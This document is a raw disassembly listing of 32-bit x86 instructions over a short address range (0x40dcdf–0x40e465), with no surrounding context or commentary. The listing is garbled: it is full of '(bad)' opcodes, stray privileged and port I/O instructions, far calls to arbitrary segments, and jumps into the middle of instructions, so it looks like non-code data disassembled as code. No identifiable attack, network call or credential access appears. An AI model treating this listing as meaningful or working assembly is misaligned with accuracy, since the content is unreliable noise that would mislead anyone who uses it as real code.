  40dcdf:	fnstcw WORD PTR cs:[esi-0x3fe3406c]
  40dce6:	jge    0x40dd41
  40dce8:	push   ebx
  40dce9:	or     eax,DWORD PTR [edi+0x28b388ed]
  40dcef:	mov    DWORD PTR [edi],esi
  40dcf1:	dec    ebx
  40dcf2:	fnstcw WORD PTR [edi+0x2e52cb3a]
  40dcf8:	push   ss
  40dcf9:	jnp    0x40dcd4
  40dcfb:	lea    esp,[ebx]
  40dcfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcfe:	ins    DWORD PTR es:[edi],dx
  40dcff:	daa    
  40dd00:	mov    ecx,eax
  40dd02:	inc    ecx
  40dd03:	adc    BYTE PTR [edi-0x3109e90c],dh
  40dd09:	adc    BYTE PTR [esi-0x17],bh
  40dd0c:	loope  0x40dcc1
  40dd0e:	pop    ebx
  40dd0f:	ret    
  40dd10:	xchg   esp,eax
  40dd11:	outs   dx,DWORD PTR ds:[esi]
  40dd12:	into   
  40dd13:	xchg   BYTE PTR [edx+0x47],ch
  40dd16:	xchg   edi,eax
  40dd17:	cdq    
  40dd18:	stos   DWORD PTR es:[edi],eax
  40dd19:	bound  ebx,QWORD PTR [esi-0x31864a18]
  40dd1f:	(bad)  
  40dd20:	mov    ah,bl
  40dd22:	mov    ecx,ds
  40dd24:	xor    eax,0xd1f6d69b
  40dd29:	inc    esi
  40dd2a:	adc    ecx,DWORD PTR [eax-0x6f]
  40dd2d:	mov    dh,0xe7
  40dd2f:	or     al,0xa1
  40dd31:	mov    ds:0x28c6cd80,eax
  40dd36:	or     al,0xc3
  40dd38:	ret    
  40dd39:	add    DWORD PTR [ebx-0xc860fa5],ecx
  40dd3f:	or     edx,DWORD PTR [eax]
  40dd41:	call   0xa603:0x9dfb7bf3
  40dd48:	jp     0x40dcdf
  40dd4a:	pop    edi
  40dd4b:	fs or  eax,ebp
  40dd4e:	sbb    ch,cl
  40dd50:	ins    DWORD PTR es:[edi],dx
  40dd51:	xchg   edx,eax
  40dd52:	(bad)  
  40dd53:	or     DWORD PTR [ebp-0x25],esi
  40dd56:	jne    0x40ddaa
  40dd58:	add    edx,DWORD PTR [ecx]
  40dd5a:	mov    ds:0x1e7be1be,eax
  40dd5f:	nop
  40dd60:	ss cli 
  40dd62:	inc    ecx
  40dd63:	jbe    0x40ddb1
  40dd65:	cmp    esp,DWORD PTR [ebp-0xa]
  40dd68:	repz sbb BYTE PTR [ebx-0x59],dl
  40dd6c:	fwait
  40dd6d:	sbb    esi,ebp
  40dd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd70:	jo     0xb2605696
  40dd76:	inc    esp
  40dd77:	ja     0x40dd5d
  40dd79:	sub    al,0x27
  40dd7b:	fidivr WORD PTR [edx+eax*4+0x5a]
  40dd7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd80:	out    dx,eax
  40dd81:	neg    BYTE PTR [edx+edi*4+0x2f]
  40dd85:	pop    edi
  40dd86:	sbb    esp,esi
  40dd88:	pop    edi
  40dd89:	dec    edx
  40dd8a:	xchg   ecx,eax
  40dd8b:	ror    BYTE PTR [ecx],1
  40dd8d:	retf   0x3b29
  40dd90:	addr16 and eax,0x321fc8af
  40dd96:	fisub  WORD PTR [edx]
  40dd98:	jno    0x40de11
  40dd9a:	bound  ebx,QWORD PTR [ecx+0x140dd68e]
  40dda0:	cmp    eax,0x1091ef38
  40dda5:	sbb    DWORD PTR [ecx+edx*1],ebx
  40dda8:	push   edi
  40dda9:	sub    ebp,DWORD PTR [ebx+0x49]
  40ddac:	cdq    
  40ddad:	add    DWORD PTR [ebx],edi
  40ddaf:	jmp    0x40dd70
  40ddb1:	mov    ebx,0xf6004883
  40ddb6:	cmp    eax,0x926fbbd2
  40ddbb:	outs   dx,BYTE PTR ds:[esi]
  40ddbc:	iret   
  40ddbd:	repz push 0xffffffa8
  40ddc0:	fst    DWORD PTR [edi]
  40ddc2:	shl    esp,1
  40ddc4:	fsub   QWORD PTR [edx+ebp*2]
  40ddc7:	sub    eax,0xbc1a2953
  40ddcc:	sub    ah,BYTE PTR [edi+0x299f80e2]
  40ddd2:	adc    eax,0x9cc72b22
  40ddd7:	adc    DWORD PTR [ebp-0x4844f390],eax
  40dddd:	adc    dh,al
  40dddf:	ret    0x8be0
  40dde2:	xor    esp,DWORD PTR [edx+ebx*2+0x26415ff9]
  40dde9:	jecxz  0x40dded
  40ddeb:	jl     0x40de3e
  40dded:	test   cl,cl
  40ddef:	ret    
  40ddf0:	data16 jns 0x40de6e
  40ddf3:	jne    0x40de73
  40ddf5:	test   DWORD PTR [edx+0x75],edi
  40ddf8:	div    BYTE PTR [ebx-0x5202d6b0]
  40ddfe:	fs loopne 0x40de14
  40de01:	mov    ebx,0x5c18fa85
  40de06:	pushf  
  40de07:	daa    
  40de08:	add    BYTE PTR [edx+0x6d],dh
  40de0b:	adc    al,0x1e
  40de0d:	inc    esp
  40de0e:	cli    
  40de0f:	add    bh,al
  40de11:	out    dx,al
  40de12:	mov    ebx,0x3f12f09c
  40de17:	lock sub al,0xec
  40de1a:	(bad)  
  40de1b:	call   0xd8c06311
  40de20:	(bad)  
  40de21:	xchg   esi,eax
  40de22:	adc    BYTE PTR [ebp-0x5d],al
  40de25:	sub    BYTE PTR [ebx+0x5a],0xb1
  40de29:	push   edx
  40de2a:	xor    eax,0x77657353
  40de2f:	lds    eax,FWORD PTR [esi+0x6c]
  40de32:	icebp  
  40de33:	shr    DWORD PTR [esi-0x6d],1
  40de36:	sti    
  40de37:	add    DWORD PTR [edi*1-0x34b3f15],esi
  40de3e:	iret   
  40de3f:	mov    al,ds:0x636ec3e5
  40de44:	dec    edi
  40de45:	imul   ecx,ebx,0x63
  40de48:	or     esi,DWORD PTR [edx-0x5db961c1]
  40de4e:	ret    
  40de4f:	fdivr  DWORD PTR [ecx+0x298603c0]
  40de55:	xchg   ebx,eax
  40de56:	mov    al,ds:0x161b14af
  40de5b:	adc    edx,DWORD PTR [eax+0x9]
  40de5e:	jbe    0x40de82
  40de60:	or     dl,BYTE PTR [ecx+0x63]
  40de63:	mov    eax,0xff547cd8
  40de68:	aas    
  40de69:	jns    0x40de1c
  40de6b:	fcmovb st,st(4)
  40de6d:	pop    ebp
  40de6e:	lds    ebp,FWORD PTR [ebx]
  40de70:	sbb    eax,0x53177d8f
  40de75:	dec    eax
  40de76:	test   BYTE PTR [ecx-0x6d9025bf],al
  40de7c:	out    0x4f,eax
  40de7e:	sub    bh,BYTE PTR [eax-0x3e]
  40de81:	fld    TBYTE PTR [ebx+0x16]
  40de84:	pop    eax
  40de85:	jbe    0x40de0d
  40de87:	xchg   ebp,eax
  40de88:	dec    esp
  40de89:	inc    ebx
  40de8a:	sub    eax,0xcce05d20
  40de8f:	stos   DWORD PTR es:[edi],eax
  40de90:	lock push es
  40de92:	pop    esi
  40de93:	xchg   edx,eax
  40de94:	je     0x40deaa
  40de96:	xchg   esi,eax
  40de97:	sbb    cl,0x40
  40de9a:	out    dx,eax
  40de9b:	sbb    eax,0x2ff8abf3
  40dea0:	add    dl,bh
  40dea2:	jle    0x40de9c
  40dea4:	mov    al,0xe
  40dea6:	cmp    bh,BYTE PTR [eiz*8-0x5c1ff7c4]
  40dead:	inc    eax
  40deae:	lahf   
  40deaf:	loopne 0x40deb1
  40deb1:	jge    0x40df2a
  40deb3:	or     al,0x13
  40deb5:	pop    edi
  40deb6:	pop    edx
  40deb7:	mov    DWORD PTR [ebx+0xe],esp
  40deba:	pop    esp
  40debb:	cld    
  40debc:	pop    esi
  40debd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40debe:	data16 aas 
  40dec0:	popa   
  40dec1:	sub    eax,0x4a964b5f
  40dec6:	loop   0x40df2e
  40dec8:	xchg   edx,eax
  40dec9:	or     eax,0x95b2f2e1
  40dece:	lods   eax,DWORD PTR ds:[esi]
  40decf:	sti    
  40ded0:	ds dec eax
  40ded2:	or     al,BYTE PTR [eax-0x53390f0d]
  40ded8:	xchg   ecx,eax
  40ded9:	pop    eax
  40deda:	mov    bl,0xd9
  40dedc:	add    DWORD PTR [ebx-0x14],ebp
  40dedf:	loope  0x40df08
  40dee1:	jmp    0x40dedd
  40dee3:	xchg   edi,eax
  40dee4:	lods   al,BYTE PTR ds:[esi]
  40dee5:	fmul   DWORD PTR [ebx+esi*8+0x1d6aaafb]
  40deec:	or     dl,dh
  40deee:	cmp    ch,BYTE PTR [edx+0x1f2b6c1]
  40def4:	(bad)  
  40def5:	rcr    esi,cl
  40def7:	adc    bl,bl
  40def9:	addr16 je 0x40df70
  40defc:	cdq    
  40defd:	shr    ah,cl
  40deff:	(bad)  
  40df00:	mov    ecx,0xd42658d1
  40df05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df06:	out    dx,al
  40df07:	add    BYTE PTR [eax],0x4c
  40df0a:	outs   dx,BYTE PTR ds:[esi]
  40df0b:	adc    al,0xc5
  40df0d:	dec    esi
  40df0e:	pop    edi
  40df0f:	xlat   BYTE PTR ds:[ebx]
  40df10:	mov    eax,0xefd83ed1
  40df15:	inc    eax
  40df16:	xor    DWORD PTR [eax-0x5f30a437],edx
  40df1c:	fisub  DWORD PTR [edx+0x43]
  40df1f:	xchg   ecx,eax
  40df20:	dec    edx
  40df21:	mov    ds:0x3fab1ad0,al
  40df26:	ficomp WORD PTR [edi]
  40df28:	mov    al,0xd6
  40df2a:	or     eax,0x288693b3
  40df2f:	xor    al,0x9c
  40df31:	xor    ch,0x50
  40df34:	xchg   ebx,esi
  40df36:	and    al,ch
  40df38:	shl    BYTE PTR [eax+0x627a4d1b],cl
  40df3e:	sti    
  40df3f:	mov    edi,0xf9e5b1f9
  40df44:	and    esi,esp
  40df46:	pop    edi
  40df47:	bnd ja 0x40df61
  40df4a:	ret    0xa1f9
  40df4d:	jp     0x40def0
  40df4f:	mov    bl,BYTE PTR [esi+0x4f47effe]
  40df55:	cmp    edx,DWORD PTR [eax+0x6505b832]
  40df5b:	fidivr WORD PTR [ebx+ebp*8-0x56]
  40df5f:	inc    edi
  40df60:	adc    al,0x36
  40df62:	mov    ch,0x6e
  40df64:	mov    fs,WORD PTR [ecx-0x24a8819]
  40df6a:	(bad)  
  40df6b:	gs pop ss
  40df6d:	shl    ebx,0x88
  40df70:	mov    ds:0x7b16d8ca,eax
  40df75:	ret    
  40df76:	fld    TBYTE PTR ds:0x7084d988
  40df7c:	mov    BYTE PTR [edx-0x73],al
  40df7f:	rcl    BYTE PTR [esi-0x57],0xc1
  40df83:	xchg   esp,eax
  40df84:	dec    ebp
  40df85:	jo     0x40df96
  40df87:	adc    dl,dl
  40df89:	and    al,0xdc
  40df8b:	xlat   BYTE PTR ds:[ebx]
  40df8c:	and    al,0xb6
  40df8e:	mov    ds:0x206ffba,al
  40df93:	fwait
  40df94:	mov    al,ds:0x38199f8d
  40df99:	jl     0x40df99
  40df9b:	sbb    eax,0xf48ca070
  40dfa0:	jae    0x40dfce
  40dfa2:	loop   0x40dfe1
  40dfa4:	jp     0x40dfad
  40dfa6:	sbb    eax,DWORD PTR [ebp+edi*8-0x5a]
  40dfaa:	sbb    dl,BYTE PTR [eax]
  40dfac:	js     0x40df3e
  40dfae:	icebp  
  40dfaf:	ja     0x40df80
  40dfb1:	push   0xffffff81
  40dfb3:	mov    ds:0x8ac049,eax
  40dfb8:	mov    ch,0x5b
  40dfba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfbb:	pop    eax
  40dfbc:	mov    dl,0x4
  40dfbe:	out    0xea,eax
  40dfc0:	cwde   
  40dfc1:	add    esp,DWORD PTR [esi]
  40dfc3:	sub    ebp,edi
  40dfc5:	jle    0x40dfac
  40dfc7:	and    eax,0xf3053d7b
  40dfcc:	inc    esp
  40dfcd:	xor    esi,ebx
  40dfcf:	and    al,0xd7
  40dfd1:	retf   
  40dfd2:	mov    ds:0x29fe697e,al
  40dfd7:	ss repz (bad) 
  40dfdb:	imul   ebp,DWORD PTR es:[edx-0xe],0x3cff64bf
  40dfe3:	ins    BYTE PTR es:[edi],dx
  40dfe4:	add    al,0x20
  40dfe6:	sub    ecx,DWORD PTR [esi]
  40dfe8:	out    dx,al
  40dfe9:	mov    edx,0xd09c8145
  40dfee:	dec    esi
  40dfef:	xor    BYTE PTR [ebx],ch
  40dff1:	mov    al,0x98
  40dff3:	mov    ebx,0x647ed5d8
  40dff8:	je     0x40df94
  40dffa:	jl     0x40e020
  40dffc:	mov    eax,ds:0x3e27392e
  40e001:	jl     0x40e028
  40e003:	rcl    BYTE PTR ds:0x5e792910,cl
  40e009:	mov    cl,0xfb
  40e00b:	pop    eax
  40e00c:	lock lea eax,[eax+0x7e]
  40e010:	mov    edx,0x655e7395
  40e015:	aaa    
  40e016:	inc    esi
  40e017:	int    0x69
  40e019:	repz jno 0x40e072
  40e01c:	adc    al,0xb0
  40e01e:	jge    0x40e026
  40e020:	add    DWORD PTR [esi],eax
  40e022:	in     eax,0xa3
  40e024:	sub    al,0x2d
  40e026:	add    BYTE PTR ds:0x20c4c5a0,cl
  40e02c:	pop    ebx
  40e02d:	xor    BYTE PTR [edx+0x6f],0xba
  40e031:	in     al,dx
  40e032:	jle    0x40e02b
  40e034:	cmp    eax,DWORD PTR [edx]
  40e036:	add    eax,0x46c73258
  40e03b:	popf   
  40e03c:	push   edx
  40e03d:	js     0x40dfca
  40e03f:	mov    ch,ch
  40e041:	mov    esi,0xae889acb
  40e046:	sahf   
  40e047:	iret   
  40e048:	cmp    BYTE PTR [edi+0x7e],ch
  40e04b:	xchg   edx,eax
  40e04c:	dec    ebx
  40e04d:	stc    
  40e04e:	push   eax
  40e04f:	stc    
  40e050:	jb     0x40e00b
  40e052:	in     eax,dx
  40e053:	popfw  
  40e055:	pop    eax
  40e056:	lahf   
  40e057:	sub    BYTE PTR [edx],bh
  40e059:	cs retf 0xae1a
  40e05d:	fld    TBYTE PTR ds:[esi]
  40e060:	dec    ebx
  40e061:	mov    ds:0x81d3096e,al
  40e066:	jle    0x40e091
  40e068:	jno    0x40e097
  40e06a:	adc    BYTE PTR [ebx+ecx*1],al
  40e06d:	cmc    
  40e06e:	cmp    BYTE PTR [ebp-0x57],ch
  40e071:	adc    al,BYTE PTR [edi-0x37]
  40e074:	and    al,BYTE PTR [eax-0x3d]
  40e077:	push   eax
  40e078:	adc    DWORD PTR [edi+0x7e816da],esi
  40e07e:	sub    esi,esp
  40e080:	push   edx
  40e081:	fsub   st,st(2)
  40e083:	push   eax
  40e084:	stc    
  40e085:	repz and DWORD PTR [ecx],edx
  40e088:	fnstcw WORD PTR [esi-0x3c]
  40e08b:	or     ch,ah
  40e08d:	in     al,dx
  40e08e:	es test al,0x41
  40e091:	mov    ch,0x93
  40e093:	and    ah,BYTE PTR [ecx-0x6ee59bd7]
  40e099:	outs   dx,DWORD PTR ds:[esi]
  40e09a:	dec    eax
  40e09b:	add    BYTE PTR [esp+esi*2+0x4c],ch
  40e09f:	sbb    BYTE PTR [ebx-0x6e],cl
  40e0a2:	out    0xed,eax
  40e0a4:	fiadd  DWORD PTR [edx-0x1ab3ff7e]
  40e0aa:	fwait
  40e0ab:	cwde   
  40e0ac:	stc    
  40e0ad:	and    BYTE PTR [edi+0x6855fa48],bl
  40e0b3:	aam    0xb2
  40e0b5:	add    BYTE PTR [edx-0x1cf410d4],cl
  40e0bb:	or     DWORD PTR [esi],0xffffffc9
  40e0be:	sbb    DWORD PTR [eax],ebx
  40e0c0:	jge    0x40e054
  40e0c2:	test   al,0xb4
  40e0c4:	ins    DWORD PTR es:[edi],dx
  40e0c5:	mov    DWORD PTR [ebx-0x3d],esp
  40e0c8:	scas   eax,DWORD PTR es:[edi]
  40e0c9:	pop    ebx
  40e0ca:	mov    ecx,0xe6af7058
  40e0cf:	lea    esp,[ecx+ecx*8]
  40e0d2:	ss icebp 
  40e0d4:	xlat   BYTE PTR ds:[ebx]
  40e0d5:	je     0x40e0d4
  40e0d7:	mov    ds:0x9830e3a0,eax
  40e0dc:	into   
  40e0dd:	ins    BYTE PTR es:[edi],dx
  40e0de:	addr16 jmp 0xfc35b5d0
  40e0e4:	xor    ecx,DWORD PTR [ebp-0x60ad826d]
  40e0ea:	lods   al,BYTE PTR ds:[esi]
  40e0eb:	dec    esp
  40e0ec:	ror    DWORD PTR [eax+0x6e],cl
  40e0ef:	das    
  40e0f0:	sbb    DWORD PTR [ebx-0x48],ebp
  40e0f3:	add    ch,BYTE PTR [esi-0x43]
  40e0f6:	fmul   DWORD PTR [ecx]
  40e0f8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40e0fa:	cld    
  40e0fb:	enter  0x49cf,0x10
  40e0ff:	lahf   
  40e100:	mov    al,fs:0x7008ef24
  40e106:	mov    BYTE PTR [esi],ch
  40e108:	cmp    eax,0x5ec3e7c3
  40e10d:	arpl   WORD PTR [edx+0x2323b12f],bx
  40e113:	shl    edi,0xa9
  40e116:	outs   dx,DWORD PTR ds:[esi]
  40e117:	aaa    
  40e118:	sbb    DWORD PTR [eax+ebp*8+0x5bf554c6],0x1e
  40e120:	inc    esp
  40e121:	push   eax
  40e122:	or     edi,DWORD PTR [eax]
  40e124:	jp     0x40e176
  40e126:	fistp  QWORD PTR [ebp-0x4c]
  40e129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e12a:	retf   0x7a37
  40e12d:	pop    ebx
  40e12e:	xchg   edi,eax
  40e12f:	shl    BYTE PTR [eax-0x78f5bc6a],0x19
  40e136:	(bad)  
  40e137:	pop    edx
  40e138:	push   ecx
  40e139:	xor    ebp,DWORD PTR [edi+0x0]
  40e13c:	inc    esi
  40e13d:	adc    DWORD PTR [edx-0x5f3c22b4],esp
  40e143:	mov    esi,0xd7b7f47d
  40e148:	push   cs
  40e149:	aad    0xfb
  40e14b:	add    dh,BYTE PTR ds:0x87aebeb6
  40e151:	fst    QWORD PTR [ebp-0x2f975dbc]
  40e157:	xchg   ebx,eax
  40e158:	stos   BYTE PTR es:[edi],al
  40e159:	fisttp WORD PTR [edi+0x3cd25378]
  40e15f:	cs int3 
  40e161:	mov    edi,0xb516ae83
  40e166:	cli    
  40e167:	shl    BYTE PTR [edx],0x5b
  40e16a:	lods   al,BYTE PTR ds:[esi]
  40e16b:	mov    dh,0xd8
  40e16d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40e16f:	leave  
  40e170:	(bad)  
  40e171:	xor    eax,0x4cc543f6
  40e176:	push   cs
  40e177:	or     ecx,esi
  40e179:	push   ecx
  40e17a:	nop
  40e17b:	retf   0x3f66
  40e17e:	pop    es
  40e17f:	mov    esp,0xdfc77588
  40e184:	ds mov dl,0x85
  40e187:	in     eax,0xa
  40e189:	call   0xb07c8389
  40e18e:	loopne 0x40e162
  40e190:	sbb    ebp,DWORD PTR [ebx]
  40e192:	sbb    dl,BYTE PTR [ebx]
  40e194:	call   0xe05e:0xc7eb0ddb
  40e19b:	fs dec ebp
  40e19d:	pop    ebx
  40e19e:	retf   
  40e19f:	adc    bl,BYTE PTR [edi]
  40e1a1:	mov    al,0x8f
  40e1a3:	out    0xc2,al
  40e1a5:	popf   
  40e1a6:	imul   BYTE PTR [edx-0x1b0f0080]
  40e1ac:	cmp    ebp,ecx
  40e1ae:	cwde   
  40e1af:	ficom  WORD PTR [ebx]
  40e1b1:	xchg   edx,eax
  40e1b2:	pop    esi
  40e1b3:	test   al,0xd0
  40e1b5:	stos   DWORD PTR es:[edi],eax
  40e1b6:	mov    ss,WORD PTR [eax+0x71a58d14]
  40e1bc:	mov    DWORD PTR [ecx+0xd],ebp
  40e1bf:	mov    esi,0xedd1f324
  40e1c4:	test   dh,bl
  40e1c6:	mov    ds:0xce74fe80,eax
  40e1cb:	push   ds
  40e1cc:	stos   BYTE PTR es:[edi],al
  40e1cd:	jo     0x40e195
  40e1cf:	js     0x40e17c
  40e1d1:	stos   DWORD PTR es:[edi],eax
  40e1d2:	pop    ebp
  40e1d3:	inc    ebx
  40e1d4:	adc    eax,0x645d867f
  40e1d9:	mov    bl,0xa6
  40e1db:	mov    bh,0x18
  40e1dd:	add    al,0xb
  40e1df:	in     eax,dx
  40e1e0:	(bad)  
  40e1e1:	rol    ch,1
  40e1e3:	xlat   BYTE PTR ds:[ebx]
  40e1e4:	cmc    
  40e1e5:	or     ecx,DWORD PTR [ebx]
  40e1e7:	ja     0x40e16f
  40e1e9:	mov    ds:0x940f0a20,eax
  40e1ee:	pop    edi
  40e1ef:	je     0x40e1d7
  40e1f1:	call   0xe0ec:0x560ffc13
  40e1f8:	xchg   DWORD PTR [ebx+0x45],ecx
  40e1fb:	pop    ds
  40e1fc:	fld    TBYTE PTR [ecx]
  40e1fe:	imul   ebx,DWORD PTR [eax],0x71
  40e201:	adc    al,0x9d
  40e203:	add    esp,DWORD PTR [ecx-0x4700c9a]
  40e209:	adc    al,0xfe
  40e20b:	jl     0x40e1ae
  40e20d:	scas   al,BYTE PTR es:[edi]
  40e20e:	add    al,0x98
  40e210:	ins    DWORD PTR es:[edi],dx
  40e211:	inc    ecx
  40e212:	sar    BYTE PTR [eax-0x4dcbeaec],cl
  40e218:	jecxz  0x40e1d5
  40e21a:	mov    dl,0xfe
  40e21c:	sbb    DWORD PTR [ebx-0x1499a81a],esp
  40e222:	loop   0x40e1c2
  40e224:	sub    esi,ecx
  40e226:	xchg   ecx,eax
  40e227:	fs pop edi
  40e229:	mov    edi,DWORD PTR [ecx+0x3e7a4ee0]
  40e22f:	je     0x40e203
  40e231:	or     BYTE PTR [edx+0x759a8f98],0x6a
  40e238:	add    ecx,ebx
  40e23a:	fbstp  TBYTE PTR [eax-0x7d613ab0]
  40e240:	nop
  40e241:	jecxz  0x40e268
  40e243:	repz retf 
  40e245:	rcl    BYTE PTR [ecx+0x1b],1
  40e248:	adc    BYTE PTR [ecx+0x3b],ch
  40e24b:	mov    esp,0x9d81e987
  40e250:	sbb    al,0x9
  40e252:	leave  
  40e253:	je     0x40e2d0
  40e255:	inc    ecx
  40e256:	in     al,dx
  40e257:	jmp    0xe17c:0xbe2c2ee8
  40e25e:	adc    eax,DWORD PTR [ebx]
  40e260:	and    dl,BYTE PTR [eax]
  40e262:	scas   al,BYTE PTR es:[edi]
  40e263:	mov    esi,DWORD PTR [esp+eax*2-0xce97f05]
  40e26a:	clc    
  40e26b:	ret    
  40e26c:	les    edi,FWORD PTR [ebx-0x28c96de2]
  40e272:	sbb    DWORD PTR [edi],esp
  40e274:	sub    eax,0x59a7e9b4
  40e279:	cmp    al,0x92
  40e27b:	pop    ebp
  40e27c:	pop    ss
  40e27d:	and    DWORD PTR [ebx],0x6f
  40e280:	lock ret 0xd718
  40e284:	repz mov al,0x6e
  40e287:	data16 add dl,BYTE PTR [ebx+0xe57c4f7]
  40e28e:	not    BYTE PTR [esp+ecx*4-0x4d]
  40e292:	xchg   BYTE PTR [ebx-0xdf9d10f],cl
  40e298:	jge    0x40e2a1
  40e29a:	(bad)  
  40e29b:	retf   0x1a12
  40e29e:	xchg   BYTE PTR [edx],bh
  40e2a0:	shl    edx,0xf5
  40e2a3:	or     DWORD PTR ds:0xb7317c00,eax
  40e2a9:	mov    esi,0xb03bacfe
  40e2ae:	(bad)  
  40e2af:	out    0xc2,eax
  40e2b1:	add    ebx,DWORD PTR [ebx+0x47c96573]
  40e2b7:	push   0xffffff82
  40e2b9:	out    0x9d,al
  40e2bb:	sbb    DWORD PTR [edi-0x508c6c61],ecx
  40e2c1:	mov    dl,0xf5
  40e2c3:	dec    edx
  40e2c4:	lock fisub WORD PTR [edx+0x5]
  40e2c8:	lods   eax,DWORD PTR ss:[esi]
  40e2ca:	pop    edx
  40e2cb:	jmp    FWORD PTR [esi]
  40e2cd:	adc    BYTE PTR ds:0x6ed17b29,dh
  40e2d3:	inc    ebp
  40e2d4:	add    eax,0xb817b25d
  40e2d9:	dec    edx
  40e2da:	ins    DWORD PTR es:[edi],dx
  40e2db:	bound  ebp,QWORD PTR ds:0xea8f6606
  40e2e1:	cdq    
  40e2e2:	jp     0x40e301
  40e2e4:	add    ch,ah
  40e2e6:	push   ds
  40e2e7:	ss adc dl,dh
  40e2ea:	and    BYTE PTR [edx+0x2e104e4f],bl
  40e2f0:	mov    dh,0xd
  40e2f2:	push   edi
  40e2f3:	ds imul bh
  40e2f6:	jb     0x40e2a7
  40e2f8:	mov    bh,BYTE PTR [ebx+ecx*4]
  40e2fb:	ja     0x40e37b
  40e2fd:	mov    edi,0x2ad03d6a
  40e302:	inc    edx
  40e303:	mov    bh,0x8
  40e305:	lods   eax,DWORD PTR ds:[esi]
  40e306:	mov    esp,0x6ff5880f
  40e30b:	shl    eax,1
  40e30d:	mov    bh,0x7d
  40e30f:	loope  0x40e37c
  40e311:	jnp    0x40e294
  40e313:	outs   dx,DWORD PTR ds:[esi]
  40e314:	or     ch,dl
  40e316:	adc    esp,DWORD PTR [ebx+0x35c33713]
  40e31c:	dec    ebx
  40e31d:	pminub mm4,QWORD PTR [eax-0x7a]
  40e321:	nop
  40e322:	inc    ebx
  40e323:	sub    ch,bh
  40e325:	ja     0x40e2b2
  40e327:	dec    ebx
  40e328:	mov    WORD PTR [eax-0x11],?
  40e32b:	pop    edx
  40e32c:	call   0xf783:0x9ee487f8
  40e333:	loop   0x40e385
  40e335:	arpl   cx,sp
  40e337:	cmp    eax,0x5f8fd0d6
  40e33c:	iret   
  40e33d:	dec    edi
  40e33e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e33f:	jge    0x40e3a3
  40e341:	cmovae eax,DWORD PTR [ecx+0x3]
  40e345:	xchg   eax,edx
  40e347:	lahf   
  40e348:	dec    ebx
  40e349:	pop    ecx
  40e34a:	jbe    0x40e2d2
  40e34c:	cwde   
  40e34d:	or     al,0xa1
  40e34f:	fwait
  40e350:	xor    DWORD PTR [ebx-0x2916914b],esi
  40e356:	add    esi,edx
  40e358:	loopne 0x40e2fb
  40e35a:	ja     0x40e32a
  40e35c:	lea    esi,[eax+0x5d]
  40e35f:	pop    ds
  40e360:	cmp    eax,0xc9d2cee1
  40e365:	mov    bh,0x36
  40e367:	cvtpi2ps xmm4,QWORD PTR [ebp+eax*8-0x1b]
  40e36c:	pop    esp
  40e36d:	mov    ebx,0x3b3db1de
  40e372:	inc    ecx
  40e373:	je     0x40e384
  40e375:	(bad)  
  40e376:	push   ebx
  40e377:	or     eax,0x79f47c92
  40e37c:	(bad)  
  40e37d:	mov    ds:0xeff98efa,eax
  40e382:	pop    eax
  40e384:	cli    
  40e385:	outs   dx,DWORD PTR ds:[esi]
  40e386:	mov    ds:0xb0b355b9,eax
  40e38b:	adc    ch,BYTE PTR [ebx-0x48]
  40e38e:	sbb    BYTE PTR [ebp+0x499d8601],cl
  40e394:	(bad)  
  40e395:	or     eax,0x71d9f9f6
  40e39a:	adc    al,0xa
  40e39c:	repz pop edx
  40e39e:	aam    0xf8
  40e3a0:	mov    edi,0x587a9291
  40e3a5:	stos   DWORD PTR es:[edi],eax
  40e3a6:	es add al,0x8b
  40e3a9:	sti    
  40e3aa:	out    dx,al
  40e3ab:	mov    BYTE PTR [edi],ah
  40e3ad:	shl    DWORD PTR [edx-0x6d8bdd28],cl
  40e3b3:	mov    eax,ds:0x78455b64
  40e3b8:	dec    edi
  40e3b9:	xchg   cl,bh
  40e3bb:	add    al,BYTE PTR ds:0xde867ac5
  40e3c1:	or     DWORD PTR [edi-0x76837cd],edx
  40e3c7:	or     eax,0xd248f0bf
  40e3cc:	cmp    edx,DWORD PTR [edi+0x295ad9cd]
  40e3d2:	leave  
  40e3d3:	or     BYTE PTR [ebx],bh
  40e3d5:	ins    BYTE PTR es:[edi],dx
  40e3d6:	and    bl,BYTE PTR [edx+0x1a4b4896]
  40e3dc:	jb     0x40e3df
  40e3de:	mov    al,ds:0x9940f9b3
  40e3e3:	cmp    BYTE PTR [eax-0x71],ah
  40e3e6:	add    bl,BYTE PTR [edx-0x4f]
  40e3e9:	scas   al,BYTE PTR es:[edi]
  40e3ea:	push   ebx
  40e3eb:	dec    edx
  40e3ec:	push   ebx
  40e3ed:	jnp    0x40e3e3
  40e3ef:	jecxz  0x40e394
  40e3f1:	xor    edx,DWORD PTR ds:0x29e5a09b
  40e3f7:	mov    esi,0xc5733ae
  40e3fc:	mov    dl,0xd
  40e3fe:	and    al,0x3a
  40e400:	fldenv [esi]
  40e402:	jno    0x40e3ca
  40e404:	mov    BYTE PTR [edx+0x18],ah
  40e407:	fcom   QWORD PTR [ebp+0x2127336e]
  40e40d:	call   0x103a:0xd88e8aeb
  40e414:	xchg   BYTE PTR [edi],dh
  40e416:	iret   
  40e417:	and    BYTE PTR [eax-0x1aa005fc],dl
  40e41d:	jo     0x40e416
  40e41f:	repz in eax,0xda
  40e422:	add    al,0x73
  40e424:	ret    0xf0ec
  40e427:	in     eax,dx
  40e428:	mov    dh,BYTE PTR [ebx-0x2f]
  40e42b:	push   0x13
  40e42d:	cmp    edx,DWORD PTR [eax+0x5923c9ce]
  40e433:	xor    DWORD PTR [edx+0x44f56f7d],edi
  40e439:	or     BYTE PTR [ebx+ecx*2-0x5cb685b5],bl
  40e440:	shr    BYTE PTR [ebx+edi*2-0x52],1
  40e444:	or     BYTE PTR [esi+0x6368141e],bl
  40e44a:	int3   
  40e44b:	pop    ebp
  40e44c:	dec    ebx
  40e44d:	js     0x40e463
  40e44f:	and    esi,0xa9002745
  40e455:	mov    bl,BYTE PTR [eax+0x6071149]
  40e45b:	or     ebp,DWORD PTR [eax+0x5e4ed954]
  40e461:	(bad)  
  40e462:	xchg   esp,eax
  40e463:	push   es
  40e464:	retf   
  40e465:	(bad)  
